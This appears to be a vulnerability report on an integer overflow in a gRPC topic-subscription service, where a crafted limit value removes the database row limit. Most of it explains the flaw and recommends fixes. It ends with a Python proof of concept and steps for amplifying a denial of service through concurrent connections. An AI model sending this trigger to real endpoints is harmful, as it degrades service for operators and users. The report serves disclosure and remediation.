### Title
Integer Overflow in `poll()` Causes Unlimited Database Queries via Crafted `limit` Value

### Summary
In `PollingTopicMessageRetriever.poll()`, the expression `(int)(filter.getLimit() - context.getTotal().get())` silently overflows to `Integer.MIN_VALUE` when `filter.getLimit()` is any value greater than `Integer.MAX_VALUE` (e.g., `2147483648L`). The resulting negative `pageSize` bypasses the `hasLimit()` guard in `findByFilter()`, causing the JPA query to execute without a `LIMIT` clause and return all matching rows from the database. The same pattern exists identically in `PollingTopicListener.poll()`. Any unauthenticated gRPC client can trigger this.

### Finding Description

**Input path — no upper-bound validation:**

`ConsensusController.toFilter()` maps the protobuf `uint64 limit` field directly to `TopicMessageFilter.limit` (a Java `long`):

```java
// ConsensusController.java:56
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
```

`TopicMessageFilter.limit` carries only `@Min(0)` — there is no `@Max` constraint:

```java
// TopicMessageFilter.java:25-26
@Min(0)
private long limit;
```

A value of `2147483648L` (Integer.MAX_VALUE + 1) satisfies `@Min(0)` and passes all validation.

**Integer overflow in `poll()`:**

```java
// PollingTopicMessageRetriever.java:68-71
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getTotal().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, context.getMaxPageSize());
```

With `filter.getLimit() = 2147483648L` and `context.getTotal().get() = 0`:
- `2147483648L - 0L = 2147483648L`
- `(int) 2147483648L = -2147483648` (Integer.MIN_VALUE — silent narrowing overflow)
- `Math.min(-2147483648, maxPageSize) = -2147483648`

**Negative limit bypasses `hasLimit()` in `findByFilter()`:**

The overflowed `pageSize` is written into a new filter:

```java
// PollingTopicMessageRetriever.java:75
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
```

`pageSize` is an `int` with value `-2147483648`; stored as `long` it remains `-2147483648L`. In `TopicMessageRepositoryCustomImpl.findByFilter()`:

```java
// TopicMessageRepositoryCustomImpl.java:51-53
if (filter.hasLimit()) {          // hasLimit() = (limit > 0) = FALSE for -2147483648
    typedQuery.setMaxResults((int) filter.getLimit());
}
```

`hasLimit()` returns `false` because `-2147483648 > 0` is false. `setMaxResults()` is never called. The JPA query executes with **no LIMIT clause**, fetching every matching row in the topic.

**`isComplete()` never terminates the loop:**

```java
// PollingTopicMessageRetriever.java:122
boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
```

Here `filter` is the *original* filter where `hasLimit()` is `true` and `getLimit()` is `2147483648L`. `total.get()` would need to reach 2 billion for `limitHit` to become `true`. In throttled mode the loop also checks `pageSize.get() < retrieverProperties.getMaxPageSize()`, but if the unlimited query returns more rows than `maxPageSize`, this condition is also `false`, so polling continues indefinitely.

**Identical overflow in `PollingTopicListener.poll()`:**

```java
// PollingTopicListener.java:54-57
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
```

Same root cause, same effect.

### Impact Explanation

Each poll cycle issues a full-table scan (for the given topic) against PostgreSQL with no row limit. On a busy topic with millions of messages, this materialises the entire result set into JVM heap on every poll interval. A single malicious subscription can exhaust database connection pool resources, JVM heap, and I/O bandwidth, causing denial of service for all other subscribers. The `flux.take(filter.getLimit())` guard in `TopicMessageServiceImpl` (line 84) uses the original large limit (`2147483648L`) and does not prevent the unbounded database fetch that occurs inside each `poll()` call.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is publicly reachable with no authentication required. The trigger value (`2147483648`) is trivially constructable in any gRPC client by setting the `limit` field of `ConsensusTopicQuery` to `Integer.MAX_VALUE + 1`. No special knowledge of internals is needed; the protobuf field is `uint64` and the value is well within its range. The attack is repeatable and can be sustained with a single persistent subscription.

### Recommendation

1. **Add an upper-bound constraint** on `TopicMessageFilter.limit`:
   ```java
   @Min(0)
   @Max(Integer.MAX_VALUE)   // or a domain-appropriate maximum
   private long limit;
   ```
2. **Eliminate the unsafe narrowing cast** in both `PollingTopicMessageRetriever.poll()` and `PollingTopicListener.poll()`. Use `Math.toIntExact()` (throws on overflow) or clamp explicitly:
   ```java
   long remaining = filter.getLimit() - context.getTotal().get();
   int limit = remaining > Integer.MAX_VALUE ? Integer.MAX_VALUE : (int) remaining;
   ```
3. **Guard `findByFilter()` defensively**: reject or clamp any negative limit before calling `setMaxResults()`.

### Proof of Concept

```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from proto.TopicID_pb2 import TopicID

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=TopicID(topicNum=1),
    limit=2147483648,          # Integer.MAX_VALUE + 1 — passes @Min(0), overflows to int
)

# Each poll() call now issues SELECT ... FROM topic_message WHERE ... (no LIMIT)
# Observe: full table scan per poll interval, heap/DB exhaustion
for msg in stub.subscribeTopic(query):
    print(msg)
```

**Steps:**
1. Connect to any mirror node gRPC endpoint.
2. Send `subscribeTopic` with `limit = 2147483648` and a valid `topicID`.
3. Observe in server logs that `findByFilter` is called with a filter whose `limit` is `-2147483648` (negative), causing `hasLimit()` to return `false` and the query to run without `LIMIT`.
4. Repeat with multiple concurrent connections to amplify resource exhaustion.
